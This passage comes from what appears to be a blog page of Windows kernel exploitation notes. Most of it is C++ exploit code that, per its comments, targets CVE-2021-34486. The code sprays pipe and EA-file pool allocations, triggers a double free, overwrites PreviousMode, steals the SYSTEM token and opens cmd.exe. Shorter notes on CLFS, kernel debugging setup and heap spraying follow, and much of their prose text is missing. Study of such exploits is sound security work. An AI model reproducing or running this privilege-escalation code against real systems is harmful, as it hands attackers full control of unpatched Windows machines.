begin...\r\n&quot;</span>);</span><br><span class="line">ULONG payloadSize = size - <span class="number">0x40</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CountSprayPipe; i++)</span><br><span class="line">&#123;</span><br><span class="line">PIPE_HANDLES pipe;</span><br><span class="line">UCHAR* payload = (UCHAR*)<span class="built_in">malloc</span>(payloadSize);</span><br><span class="line"><span class="keyword">if</span> (payload == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;malloc failed, err: %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(payload, <span class="string">&#x27;p&#x27;</span>, payloadSize);</span><br><span class="line">BOOL res = <span class="built_in">CreatePipe</span>(&amp;pipe.r, &amp;pipe.w, <span class="literal">NULL</span>, payloadSize);</span><br><span class="line"><span class="keyword">if</span> (res == FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error CreatePipe\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD resultLength;</span><br><span class="line"><span class="comment">// res = WriteFile(writePipe, payload, sizeof(payload), &amp;resultLength, NULL);</span></span><br><span class="line">res = <span class="built_in">WriteFile</span>(pipe.w, payload, payloadSize, &amp;resultLength, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (res == FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;Error WriteFile\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">g_Pipe.<span class="built_in">push_back</span>(pipe);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Spray NpFr done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PNtSetEaFile)</span><span class="params">(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG)</span></span>;</span><br><span class="line">PNtSetEaFile NtSetEaFile;</span><br><span class="line"></span><br><span class="line"><span class="function">HANDLE <span class="title">Setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">g_hDevice = <span class="built_in">CreateFileW</span>(DEVICE, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == g_hDevice)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error CreateFileW DEVICE\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// wprintf(L&quot;Open device %s succeeded, handle: %p\n&quot;, DEVICE, ghDev);</span></span><br><span class="line"></span><br><span class="line">g_ThreadApcHandle = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, APCThread, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (g_ThreadApcHandle == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error CreateThread\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">g_ProcessList = (HANDLE*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(HANDLE) * CountSprayWs2P);</span><br><span class="line"><span class="keyword">if</span> (g_ProcessList == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error malloc g_ProcessList\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(g_ProcessList, <span class="built_in">sizeof</span>(HANDLE) * CountSprayWs2P, <span class="number">0xff</span>);</span><br><span class="line"></span><br><span class="line">NtSetEaFile = (PNtSetEaFile)::<span class="built_in">GetProcAddress</span>(::<span class="built_in">LoadLibraryW</span>(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtSetEaFile&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (NtSetEaFile == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error GetProcAddress(NtSetEaFile)\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Io</span></span><br><span class="line"><span class="comment">//  payloadSize chunk</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">HANDLE hPEAuth;</span><br><span class="line">UCHAR* payload;</span><br><span class="line">ULONG PayloadSize;</span><br><span class="line">&#125; ParamSprayEaFile;</span><br><span class="line"></span><br><span class="line">HANDLE* g_EaThreadList;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadSprayEaFile</span><span class="params">(LPVOID param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ParamSprayEaFile* _param = (ParamSprayEaFile*)param;</span><br><span class="line">IO_STATUS_BLOCK iostatus;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CountSprayEaFile; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">NtSetEaFile</span>(_param-&gt;hPEAuth, &amp;iostatus, _param-&gt;payload, _param-&gt;PayloadSize);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// EaFile =&gt; Io</span></span><br><span class="line"><span class="comment">// CVE-2021-34486</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SprayEaFile</span><span class="params">(ULONG size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// SYSTEM_INFO SystemInfo;</span></span><br><span class="line"><span class="comment">// GetSystemInfo(&amp;SystemInfo);</span></span><br><span class="line"><span class="comment">// GetNativeSystemInfo(&amp;SystemInfo);</span></span><br><span class="line"><span class="comment">// CountConcurrentSprayEaFile = SystemInfo.dwNumberOfProcessors;</span></span><br><span class="line">CountConcurrentSprayEaFile = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Spray Io ...\r\n&quot;</span>);</span><br><span class="line">ParamSprayEaFile* param = (ParamSprayEaFile*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ParamSprayEaFile));</span><br><span class="line"><span class="keyword">if</span> (param == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error malloc ParamSprayEaFile\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">param-&gt;PayloadSize = size - <span class="number">0x10</span>;</span><br><span class="line">param-&gt;hPEAuth = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\PEAuth&quot;</span>, GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (param-&gt;hPEAuth == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error CreateFile PEAuth \r\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">param-&gt;payload = (UCHAR*)<span class="built_in">malloc</span>(param-&gt;PayloadSize);</span><br><span class="line"><span class="keyword">if</span> (param-&gt;payload == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error malloc payload\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(param-&gt;payload, param-&gt;PayloadSize, <span class="string">&#x27;H&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// fake ProcessContext</span></span><br><span class="line">*(ULONG32*)(&amp;param-&gt;payload[<span class="number">0x0</span>]) = <span class="number">0x636F7250</span>; <span class="comment">// Proc</span></span><br><span class="line"><span class="comment">// FsContext-&gt;RequestAPC.Thread ; _ETHREAD._KTHREAD.PreviousMode</span></span><br><span class="line"><span class="comment">// !!!!! Attation + 0x30</span></span><br><span class="line">*(ULONG64*)(&amp;param-&gt;payload[<span class="number">0x38</span>]) = g_ExploitEthread + <span class="number">0x232</span> + <span class="number">0x30</span>; </span><br><span class="line"><span class="comment">// fake ProcessContext</span></span><br><span class="line"></span><br><span class="line">g_EaThreadList = (HANDLE*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(HANDLE) * CountConcurrentSprayEaFile);</span><br><span class="line"><span class="keyword">if</span> (g_EaThreadList == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error malloc g_EaThreadList\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; CountConcurrentSprayEaFile; i++)</span><br><span class="line">&#123;</span><br><span class="line">g_EaThreadList[i] = <span class="built_in">CreateThread</span>(<span class="number">0</span>, <span class="number">0</span>, ThreadSprayEaFile, param, CREATE_SUSPENDED, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (g_EaThreadList[i] == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error CreateThread ThreadSprayEaFile\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">SetThreadAffinityMask</span>(g_EaThreadList[i], <span class="number">1</span> &lt;&lt; i) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error SetThreadAffinityMask\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; CountConcurrentSprayEaFile; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//  </span></span><br><span class="line"><span class="built_in">ResumeThread</span>(g_EaThreadList[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="built_in">WaitForMultipleObjects</span>(CountConcurrentSprayEaFile, g_EaThreadList, TRUE, INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; CountConcurrentSprayEaFile; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">CloseHandle</span>(g_EaThreadList[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">CloseHandle</span>(param-&gt;hPEAuth);</span><br><span class="line"><span class="built_in">free</span>(param-&gt;payload);</span><br><span class="line"><span class="built_in">free</span>(param);</span><br><span class="line"></span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Spray Io done\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Cleanup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[+] cleanup...\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(g_hDevice);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (g_Pipe.<span class="built_in">size</span>() != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (PIPE_HANDLES p : g_Pipe)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">CloseHandle</span>(p.r);</span><br><span class="line"><span class="built_in">CloseHandle</span>(p.w);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(NTAPI *PNtReadVirtualMemory)</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ PVOID BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">_Out_writes_bytes_(BufferSize) PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ ULONG BufferSize,</span></span></span><br><span class="line"><span class="params"><span class="function">_Out_opt_ PULONG NumberOfBytesRead</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PNtWriteVirtualMemory)</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ PVOID BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ PVOID Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ ULONG NumberOfBytesToWrite,</span></span></span><br><span class="line"><span class="params"><span class="function">_Out_opt_ PULONG NumberOfBytesWritten</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">wmain</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">atexit</span>(Cleanup);</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Setup ...\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">Setup</span>();</span><br><span class="line">g_ThreadExploitHandle = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, FALSE, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Hacking thread: %#llx\r\n&quot;</span>, (ULONG64)<span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line"></span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[+] LeakByQuerySystemInfomation\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">LeakByQuerySystemInfomation</span>();</span><br><span class="line"><span class="comment">//std::cin.get();</span></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Defragment \r\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Allocate32</span>(<span class="number">0x1b000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">SprayPipe</span>(<span class="number">0x120</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Allocate target \r\n&quot;</span>);</span><br><span class="line"><span class="built_in">Allocate64</span>(<span class="number">0x1b000</span>);</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Free first \r\n&quot;</span>);</span><br><span class="line"><span class="built_in">Free64</span>();                            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Ws2P =&gt; Mdl \r\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CountSprayWs2P; i++) </span><br><span class="line">&#123;</span><br><span class="line">g_ProcessList[i] = <span class="built_in">CreateProcessFileHandle</span>(g_ThreadApcHandle);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//std::cin.get();</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Allocate Memory avoid crash \r\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CountSprayMm; i++) </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Allocate32</span>(<span class="number">0x1b000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Double free \r\n&quot;</span>);</span><br><span class="line"><span class="built_in">Free64</span>();           </span><br><span class="line"></span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Eafile =&gt; Ws2P \r\n&quot;</span>);</span><br><span class="line"><span class="built_in">SprayEaFile</span>(<span class="number">0x120</span>);</span><br><span class="line"><span class="comment">//std::cin.get();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//  BUG</span></span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Close Ws2P Process Handle \r\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CountSprayWs2P; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">CloseHandle</span>(g_ProcessList[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//DWORD dwBytesWriten;</span></span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Exploiting... \r\n&quot;</span>);</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Exploit thread: %#lx \r\n&quot;</span>, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line"><span class="comment">//WriteFile(sync.w, &quot;Y&quot;, 1, &amp;dwBytesWriten, NULL);</span></span><br><span class="line"></span><br><span class="line">HANDLE hCur = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line"><span class="comment">//std::cin.get();</span></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"><span class="comment">//std::cin.get();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//  _KTHREAD.PreviousMode0</span></span><br><span class="line">PNtWriteVirtualMemory NtWriteVirtualMemory = (PNtWriteVirtualMemory)::<span class="built_in">GetProcAddress</span>(::<span class="built_in">LoadLibraryW</span>(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtWriteVirtualMemory&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == NtWriteVirtualMemory)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error GetProcAddress NtWriteVirtualMemory\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//PNtReadVirtualMemory NtReadVirtualMemory = (PNtReadVirtualMemory)::GetProcAddress(::LoadLibraryW(L&quot;ntdll.dll&quot;), &quot;NtReadVirtualMemory&quot;);</span></span><br><span class="line"><span class="comment">//if (NULL == NtWriteVirtualMemory)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//wprintf(L&quot;[-] Error GetProcAddress NtReadVirtualMemory\r\n&quot;);</span></span><br><span class="line"><span class="comment">//exit(1);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Write EPROCESS token =&gt; SYSTEM</span></span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Read System token ...\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">3000</span>);</span><br><span class="line">ULONG BytesWritten = <span class="number">0</span>;</span><br><span class="line">ULONG64 Token[] = &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">// addr =&gt; buffer</span></span><br><span class="line"><span class="built_in">NtWriteVirtualMemory</span>(</span><br><span class="line">hCur,</span><br><span class="line">&amp;Token,</span><br><span class="line">(PVOID)(g_SystemEprocess + <span class="number">0x4b8</span> - <span class="number">0x10</span>), <span class="comment">//   +0x4b8 Token</span></span><br><span class="line"><span class="built_in">sizeof</span>(Token),</span><br><span class="line">&amp;BytesWritten);</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[*] Read System token: %#llx %#llx %#llx %#llx\n&quot;</span>, Token[<span class="number">0</span>], Token[<span class="number">1</span>], Token[<span class="number">2</span>], Token[<span class="number">3</span>]);</span><br><span class="line"><span class="keyword">if</span> (BytesWritten == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error read token, please reboot...\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//std::cin.get();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// buffer =&gt; address</span></span><br><span class="line"><span class="built_in">NtWriteVirtualMemory</span>(</span><br><span class="line">hCur,</span><br><span class="line">(PVOID)(g_CurrentEprocess + <span class="number">0x4b8</span>),</span><br><span class="line">&amp;Token[<span class="number">2</span>],</span><br><span class="line"><span class="number">8</span>,</span><br><span class="line">&amp;BytesWritten</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// write back PreviousMode =&gt; 1</span></span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Write PrevoiuaMode 1\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line">BYTE PreviousMode = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NtWriteVirtualMemory</span>(</span><br><span class="line">hCur,</span><br><span class="line">(PVOID)(g_ExploitEthread + <span class="number">0x232</span>),</span><br><span class="line">&amp;PreviousMode,</span><br><span class="line"><span class="number">1</span>,</span><br><span class="line">&amp;BytesWritten</span><br><span class="line">))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[-] Error NtWriteVirtualMemory\r\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Get shell... \r\n&quot;</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CLFS"><a href="#CLFS" class="headerlink" title="CLFS"></a>CLFS</h3><p> CLFSUAF</p><ul><li><a href="https://blog.exodusintel.com/2022/03/10/exploiting-a-use-after-free-in-windows-common-logging-file-system-clfs/">Exploiting a use-after-free in Windows Common Logging File System</a></li></ul><p>clfs.sys </p><p>todo</p><h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><p> <a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/sysinternals-suite">Sysinternals Suite</a></p><h3 id="windows-driver-reverse"><a href="#windows-driver-reverse" class="headerlink" title="windows driver reverse"></a>windows driver reverse</h3><p><a href="https://voidsec.com/windows-drivers-reverse-engineering-methodology/">windows-drivers-reverse-engineering</a></p><p>windbg</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS&gt; bcdedit /dbgsettings <span class="built_in">NET</span> HOSTIP:&lt;DEBUGGER_IP&gt; PORT:<span class="number">50000</span></span><br><span class="line">PS&gt; bcdedit /debug on</span><br></pre></td></tr></table></figure><h4 id="Devices-Symlinks"><a href="#Devices-Symlinks" class="headerlink" title="Devices &amp; Symlinks"></a>Devices &amp; Symlinks</h4><p><strong>Devices are interfaces that let processes interact with the driver</strong>while<strong>Symlink is an alias you can use while calling Win32 functions</strong>.</p><ul><li><code>IoCreateDevice</code>creates DeviceNames:<code>\Device\VulnerableDevice</code></li><li><code>IoCreateSymbolicLink</code>creates Symlinks:<code>\\.\VulnerableDevice</code></li></ul><p></p><ul><li>IoGetDeviceObjectPointerIRP</li><li>IRP</li></ul><p><strong></strong> </p><ul><li></li></ul><p> Sysinternals Suite  <code>winobj.exe</code> </p><ul><li>global  symlink device</li></ul><h4 id="Dispatch-Routines"><a href="#Dispatch-Routines" class="headerlink" title="Dispatch Routines"></a>Dispatch Routines</h4><p> MajorFunction</p><h3 id="Windows-Kernel-HeapFengshui"><a href="#Windows-Kernel-HeapFengshui" class="headerlink" title="Windows Kernel HeapFengshui"></a>Windows Kernel HeapFengshui</h3><p><a href="https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/">Windows HeapFengShui</a></p><p>heap sprayingHEVD UAF</p><p>Windows</p><ul><li></li><li>ROP</li></ul><p>Pool</p><ul><li>regular pool: X6440641616</li><li>big pool: <code>nt!PoolBigPageTable</code></li></ul><p>heap spray: Socket NamedPipe</p><ul><li>Socket4K</li><li>4KNPFS.SYS</li><li> &#x2F;NPFS DISPATCH_LEVEL(IRQL 2)NonPagedPool</li></ul><p>named pipe NPFS<code>DATA_QUEUE_ENTRY</code>NPFS</p><p><a href="https://securityinsecurity.github.io/exploiting-hevd-use-after-free/">Windows Kernel Exploitation</a>NPFS NpFr</p><ul><li> <code>CreatePipe</code> readPipewritePipe</li><li>WriteFilewritePipe</li><li>0x48BUFFER_HEADERNonPagedPool</li></ul><p>tagpoolpool<code>!poolused</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!poolfind TagString [PoolType]</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE readPipe;</span><br><span class="line">HANDLE writePipe;</span><br><span class="line">BOOL res;</span><br><span class="line">CHAR payload[<span class="number">0x30</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">RtlFillMemory</span>(payload, <span class="built_in">sizeof</span>(payload), <span class="number">0x43</span>);</span><br><span class="line"></span><br><span class="line">res = <span class="built_in">CreatePipe</span>(&amp;readPipe, &amp;writePipe, <span class="literal">NULL</span>, <span class="built_in">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!res)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;[-] Error CreatePipe&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WriteFile</span>(writePipe, payload, <span class="built_in">sizeof</span>(payload), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;read: &quot;</span> &lt;&lt; readPipe &lt;&lt; <span class="string">&quot;write: &quot;</span> &lt;&lt; writePipe &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span 